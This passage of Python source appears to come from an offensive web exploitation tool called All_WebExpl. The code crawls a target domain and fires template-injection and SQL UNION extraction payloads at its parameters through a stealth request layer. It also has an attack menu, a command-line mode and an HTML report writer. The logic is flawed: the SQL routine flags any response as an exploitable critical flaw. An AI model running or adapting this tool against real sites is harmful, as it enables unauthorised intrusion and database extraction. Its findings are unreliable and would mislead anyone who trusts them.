        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:30]:
                for payload in ['{{7*7}}', '${7*7}', '{{7*7}}', '{{7*7}}', '#{7*7}']:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response and '49' in response.text:
                            vuln = Vulnerability(
                                type='SSTI',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='Critical',
                                cwe='CWE-94',
                                description='Server-Side Template Injection allows remote code execution',
                                remediation='Sanitize user input in templates',
                                confidence=0.7,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] SSTI found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass
    
    def _exploit_sqli_extract(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
        """SQL Injection with data extraction"""
        cprint("[SQLI-EXT] Deep extraction...", Colors.DIM)
        
        targets = endpoints[:30] + [Endpoint(url=u) for u in api_endpoints[:20]]
        
        for endpoint in targets:
            url = endpoint.url
            for param in parameters[:20]:
                # Try UNION-based extraction
                for payload in ["' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT version(),database(),user()--"]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.stealth.stealth_get(test_url)
                        
                        if response:
                            vuln = Vulnerability(
                                type='SQL Injection (Data Extraction)',
                                url=test_url,
                                parameter=param,
                                payload=payload,
                                severity='Critical',
                                cwe='CWE-89',
                                description='SQL Injection allows data extraction',
                                remediation='Use parameterized queries',
                                confidence=0.7,
                                exploit_ready=True
                            )
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                cprint(f"[!] SQLi Data Extraction found: {test_url[:80]}", Colors.RED)
                            break
                    except:
                        pass

# ============================[ REPORT GENERATOR ]================================
class ReportGenerator:
    @staticmethod
    def generate(results: Dict) -> str:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"all_webexpl_report_{timestamp}.html"
        
        vulns = results.get('vulnerabilities', [])
        endpoints = results.get('endpoints', [])
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>All_WebExpl - Security Report</title>
    <style>
        body {{ background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }}
        .header {{ border-bottom: 2px solid #ffd700; padding-bottom: 10px; margin-bottom: 20px; }}
        .section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; }}
        .critical {{ color: #ff003c; }}
        .high {{ color: #ff8a00; }}
        .medium {{ color: #ffa500; }}
        .low {{ color: #ffd700; }}
        .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; margin: 2px; }}
        .badge-critical {{ background: #ff003c; color: white; }}
        .badge-high {{ background: #ff8a00; color: white; }}
        .badge-medium {{ background: #ffa500; color: white; }}
        .badge-low {{ background: #ffd700; color: black; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td, th {{ padding: 8px; border: 1px solid #333; }}
        th {{ background: #222; color: #ffd700; }}
        .gold {{ color: #ffd700; }}
        .stat-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 10px 0; }}
        .stat-card {{ background: #1a1a1a; padding: 15px; text-align: center; border: 1px solid #333; border-radius: 8px; }}
        .stat-number {{ font-size: 28px; font-weight: bold; }}
        .remediation {{ background: #1a2a1a; padding: 10px; border-left: 3px solid #00ff41; }}
    </style>
</head>
<body>
    <div class="header">
        <h1 class="gold">All_WebExpl - Security Assessment Report</h1>
        <p>Target: <span class="gold">{results.get('target', 'Unknown')}</span></p>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Author: {AUTHOR}</p>
    </div>

    <div class="section">
        <h2 class="gold">Executive Summary</h2>
        <div class="stat-grid">
            <div class="stat-card">
                <div class="stat-number" style="color:#ffd700;">{len(vulns)}</div>
                <div>Total Issues</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff003c;">{len([v for v in vulns if v.get('severity') == 'Critical'])}</div>
                <div>Critical</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff8a00;">{len([v for v in vulns if v.get('severity') == 'High'])}</div>
                <div>High</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ffa500;">{len([v for v in vulns if v.get('severity') == 'Medium'])}</div>
                <div>Medium</div>
            </div>
        </div>
        <p>Endpoints: {len(endpoints)} | API Endpoints: {len(results.get('api_endpoints', []))}</p>
    </div>

    <div class="section">
        <h2 class="gold">Vulnerability Breakdown</h2>
        <table>
            <tr><th>Type</th><th>Count</th><th>Severity</th></tr>
            {ReportGenerator._generate_summary_table(vulns)}
        </table>
    </div>

    <div class="section">
        <h2 class="gold">Detailed Vulnerabilities</h2>
        {ReportGenerator._generate_vuln_details(vulns)}
    </div>

    <div class="section">
        <h2 class="gold">Recommendations</h2>
        <div class="remediation">
            <h3>Priority Remediation:</h3>
            <ul>
                <li>Critical issues - Address immediately</li>
                <li>Implement input validation for all user inputs</li>
                <li>Use parameterized queries for database operations</li>
                <li>Implement proper authorization checks</li>
                <li>Add security headers (CSP, HSTS, X-Frame-Options)</li>
                <li>Remove sensitive information from responses</li>
                <li>Conduct regular security assessments</li>
            </ul>
        </div>
    </div>

    <div class="section" style="text-align:center; color:#666; font-size:12px;">
        <p>Report generated by All_WebExpl v{VERSION}</p>
        <p>Author: {AUTHOR} | {LICENSE}</p>
        <p>For authorized security testing only</p>
    </div>
</body>
</html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        return filename
    
    @staticmethod
    def _generate_summary_table(vulns: List) -> str:
        if not vulns:
            return "<tr><td colspan='3'>No issues found</td></tr>"
        
        counts = defaultdict(int)
        severities = {}
        for v in vulns:
            v_type = v.get('type', 'Unknown')
            counts[v_type] += 1
            if v_type not in severities:
                severity = v.get('severity', 'Low')
                if 'Critical' in severity or 'RCE' in v_type or 'SQL' in v_type:
                    severities[v_type] = 'Critical'
                elif 'High' in severity or 'XSS' in v_type or 'LFI' in v_type:
                    severities[v_type] = 'High'
                else:
                    severities[v_type] = 'Medium'
        
        html = ""
        for v_type, count in sorted(counts.items(), key=lambda x: -x[1]):
            severity = severities.get(v_type, 'Medium')
            badge = f"badge-{severity.lower()}"
            html += f"""
            <tr>
                <td>{v_type}</td>
                <td>{count}</td>
                <td><span class="badge {badge}">{severity}</span></td>
            </tr>"""
        return html
    
    @staticmethod
    def _generate_vuln_details(vulns: List) -> str:
        if not vulns:
            return "<p>No vulnerabilities detected</p>"
        
        html = ""
        for i, vuln in enumerate(vulns, 1):
            severity = vuln.get('severity', 'Low')
            badge = f"badge-{severity.lower()}"
            color = '#' + {'Critical': 'ff003c', 'High': 'ff8a00', 'Medium': 'ffa500', 'Low': 'ffd700'}.get(severity, '666')
            
            html += f"""
            <div style="background:#1a1a1a; padding:10px; margin:5px 0; border-left:3px solid {color};">
                <strong>#{i}</strong> <span class="badge {badge}">{severity}</span>
                <strong>{vuln.get('type', 'Unknown')}</strong>
                <br><span class="timestamp">URL: {vuln.get('url', 'N/A')[:100]}</span>
                <br><span class="timestamp">Parameter: {vuln.get('parameter', 'N/A')}</span>
                <br><span class="timestamp">CWE: {vuln.get('cwe', 'N/A')}</span>
                <br><span class="timestamp">Confidence: {vuln.get('confidence', 0.0) * 100:.0f}%</span>
                <br><span class="timestamp">Description: {vuln.get('description', '')}</span>
                <br><span class="timestamp">Remediation: {vuln.get('remediation', '')}</span>
            </div>"""
        return html

# ============================[ MAIN FRAMEWORK ]================================
class AllWebExpl:
    """All_WebExpl - Advanced Web Exploitation Framework"""
    
    def __init__(self):
        self.stealth = UltimateStealth()
        self.results = {}
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] All_WebExpl shutting down...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}All_WebExpl v{VERSION} - Attack Menu{Colors.WHITE}
{Colors.RED}{Colors.BOLD}Deep Attack | Intelligent | Stealth | Wide Coverage{Colors.WHITE}
{Colors.CYAN}Author: {AUTHOR}{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] Full Exploitation (All Vectors)
[2] Reconnaissance Only
[3] Vulnerability Scan Only
[4] Deep Exploitation (Advanced Vectors)
[5] Generate Report
[6] Show Results
[7] Exit
""")
    
    def full_exploitation(self):
        target = input("[>] Target Domain: ").strip()
        if not target:
            cprint("[-] Target required", Colors.RED)
            return
        
        cprint("\n[START] Full exploitation on {}".format(target), Colors.RED, bold=True)
        
        start_time = time.time()
        
        # Phase 1: Crawl
        crawler = IntelligentCrawler(target, self.stealth)
        crawl_results = crawler.crawl()
        
        # Phase 2: Exploit
        exploit_engine = AdvancedExploitation(target, self.stealth)
        vulns = exploit_engine.exploit_all(
            crawl_results['endpoints'],
            crawl_results['api_endpoints'],
            crawl_results['parameters']
        )
        
        # Results
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'endpoints': [e.url for e in crawl_results['endpoints']],
            'api_endpoints': crawl_results['api_endpoints'],
            'js_files': crawl_results['js_files'],
            'parameters': crawl_results['parameters'],
            'forms': crawl_results['forms'],
            'uploads': crawl_results['uploads'],
            'vulnerabilities': vulns,
            'duration': int(time.time() - start_time)
        }
        
        cprint(f"\n[+] Exploitation complete!", Colors.GREEN)
        cprint(f"[+] Vulnerabilities: {len(vulns)}", Colors.RED)
        cprint(f"[+] Duration: {self.results['duration']} seconds", Colors.CYAN)
    
    def recon_only(self):
        target = input("[>] Target Domain: ").strip()
        if not target:
            cprint("[-] Target required", Colors.RED)
            return
        
        cprint("[START] Reconnaissance on {}".format(target), Colors.BLUE)
        
        crawler = IntelligentCrawler(target, self.stealth)
        results = crawler.crawl()
        
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'endpoints': [e.url for e in results['endpoints']],
            'api_endpoints': results['api_endpoints'],
            'js_files': results['js_files'],
            'parameters': results['parameters'],
            'forms': results['forms'],
            'uploads': results['uploads']
        }
        
        cprint(f"\n[+] Reconnaissance complete!", Colors.GREEN)
        cprint(f"[+] Endpoints: {len(self.results['endpoints'])}", Colors.CYAN)
        cprint(f"[+] API endpoints: {len(self.results['api_endpoints'])}", Colors.CYAN)
    
    def vuln_scan(self):
        if not self.results.get('endpoints'):
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        target = self.results['target']
        cprint("[START] Vulnerability scan on {}".format(target), Colors.YELLOW)
        
        # Convert endpoints to Endpoint objects
        endpoints = []
        for url in self.results['endpoints']:
            endpoints.append(Endpoint(url=url))
        
        exploit_engine = AdvancedExploitation(target, self.stealth)
        vulns = exploit_engine.exploit_all(
            endpoints,
            self.results.get('api_endpoints', []),
            self.results.get('parameters', [])
        )
        
        self.results['vulnerabilities'] = vulns
        
        cprint(f"\n[+] Scan complete!", Colors.GREEN)
        cprint(f"[+] Vulnerabilities: {len(vulns)}", Colors.RED)
    
    def deep_exploitation(self):
        if not self.results.get('endpoints'):
            cprint("[!] Run reconnaissance first", Colors.YELLOW)
            return
        
        target = self.results['target']
        cprint("[START] Deep exploitation on {}".format(target), Colors.RED, bold=True)
        
        endpoints = [Endpoint(url=u) for u in self.results['endpoints']]
        exploit_engine = AdvancedExploitation(target, self.stealth)
        vulns = exploit_engine.exploit_all(
            endpoints,
            self.results.get('api_endpoints', []),
            self.results.get('parameters', [])
        )
        
        self.results['vulnerabilities'] = vulns
        
        cprint(f"\n[+] Deep exploitation complete!", Colors.GREEN)
        cprint(f"[+] Vulnerabilities: {len(vulns)}", Colors.RED)
    
    def generate_report(self):
        if not self.results:
            cprint("[!] No results to report", Colors.YELLOW)
            return
        
        filename = ReportGenerator.generate(self.results)
        cprint(f"[+] Report generated: {filename}", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" All_WebExpl RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        cprint(f"\n[Target] {self.results.get('target', 'N/A')}", Colors.CYAN)
        cprint(f"[Endpoints] {len(self.results.get('endpoints', []))}", Colors.CYAN)
        cprint(f"[API Endpoints] {len(self.results.get('api_endpoints', []))}", Colors.CYAN)
        cprint(f"[JS Files] {len(self.results.get('js_files', []))}", Colors.CYAN)
        cprint(f"[Parameters] {len(self.results.get('parameters', []))}", Colors.CYAN)
        cprint(f"[Forms] {len(self.results.get('forms', []))}", Colors.CYAN)
        cprint(f"[Uploads] {len(self.results.get('uploads', []))}", Colors.CYAN)
        cprint(f"[Vulnerabilities] {len(self.results.get('vulnerabilities', []))}", Colors.RED)
        
        if self.results.get('vulnerabilities'):
            cprint("\n[!] Vulnerabilities:", Colors.RED)
            for vuln in self.results['vulnerabilities'][:10]:
                severity = vuln.get('severity', 'Low')
                color = Colors.RED if severity == 'Critical' else Colors.YELLOW
                cprint(f"    - {vuln.get('type', 'Unknown')} ({severity}): {vuln.get('url', 'N/A')[:60]}", color)
        
        print("="*60)
    
    def run(self):
        print_banner()
        cprint("[*] All_WebExpl - Advanced Web Exploitation Framework", Colors.CYAN)
        cprint("[*] Deep Attack | Intelligent | Stealth | Wide Coverage", Colors.DIM)
        cprint("[!] WARNING: This tool is EXTREMELY DANGEROUS", Colors.RED)
        cprint("[!] Use only in authorized environments", Colors.RED)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.full_exploitation()
            elif choice == '2':
                self.recon_only()
            elif choice == '3':
                self.vuln_scan()
            elif choice == '4':
                self.deep_exploitation()
            elif choice == '5':
                self.generate_report()
            elif choice == '6':
                self.show_results()
            elif choice == '7':
                cprint("[*] All_WebExpl shutting down...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ============================[ MAIN ]================================
def main():
    parser = argparse.ArgumentParser(
        description="All_WebExpl - Advanced Web Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 all_webexpl.py -t example.com --full
  python3 all_webexpl.py -t example.com --recon
  python3 all_webexpl.py -t example.com --deep
        """
    )
    
    parser.add_argument("-t", "--target", help="Target domain")
    parser.add_argument("--full", action="store_true", help="Full exploitation")
    parser.add_argument("--recon", action="store_true", help="Reconnaissance only")
    parser.add_argument("--deep", action="store_true", help="Deep exploitation")
    parser.add_argument("--report", action="store_true", help="Generate report")
    
    args = parser.parse_args()
    
    tool = AllWebExpl()
    
    if args.target and args.full:
        tool.results['target'] = args.target
        # Run full exploitation
        crawler = IntelligentCrawler(args.target, tool.stealth)
        crawl_results = crawler.crawl()
        exploit_engine = AdvancedExploitation(args.target, tool.stealth)
        vulns = exploit_engine.exploit_all(
            crawl_results['endpoints'],
            crawl_results['api_endpoints'],
            crawl_results['parameters']
        )
        tool.results = {
            'target': args.target,
            'timestamp': datetime.now().isoformat(),
            'endpoints': [e.url for e in crawl_results['endpoints']],
            'api_endpoints': crawl_results['api_endpoints'],
            'vulnerabilities': vulns
        }
        if args.report:
            ReportGenerator.generate(tool.results)
        tool.show_results()
        sys.exit(0)
    
    if args.target and args.recon:
        crawler = IntelligentCrawler(args.target, tool.stealth)
        results = crawler.crawl()
        tool.results = {
            'target': args.target,
            'timestamp': datetime.now().isoformat(),
            'endpoints': [e.url for e in results['endpoints']],
            'api_endpoints': results['api_endpoints'],
            'js_files': results['js_files'],
            'parameters': results['parameters'],
            'forms': results['forms'],
            'uploads': results['uploads']
        }
        if args.report:
            ReportGenerator.generate(tool.results)
        tool.show_results()
        sys.exit(0)
    
    if args.target and args.deep:
        tool.results['target'] = args.target
        crawler = IntelligentCrawler(args.target, tool.stealth)
        crawl_results = crawler.crawl()
        exploit_engine = AdvancedExploitation(args.target, tool.stealth)
        vulns = exploit_engine.exploit_all(
            crawl_results['endpoints'],
            crawl_results['api_endpoints'],
            crawl_results['parameters']
        )
        tool.results = {
            'target': args.target,
            'timestamp': datetime.now().isoformat(),
            'endpoints': [e.url for e in crawl_results['endpoints']],
            'api_endpoints': crawl_results['api_endpoints'],
            'vulnerabilities': vulns
        }
        if args.report:
            ReportGenerator.generate(tool.results)
        tool.show_results()
        sys.exit(0)
    
    if args.report and tool.results:
        ReportGenerator.generate(tool.results)
        sys.exit(0)
    
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
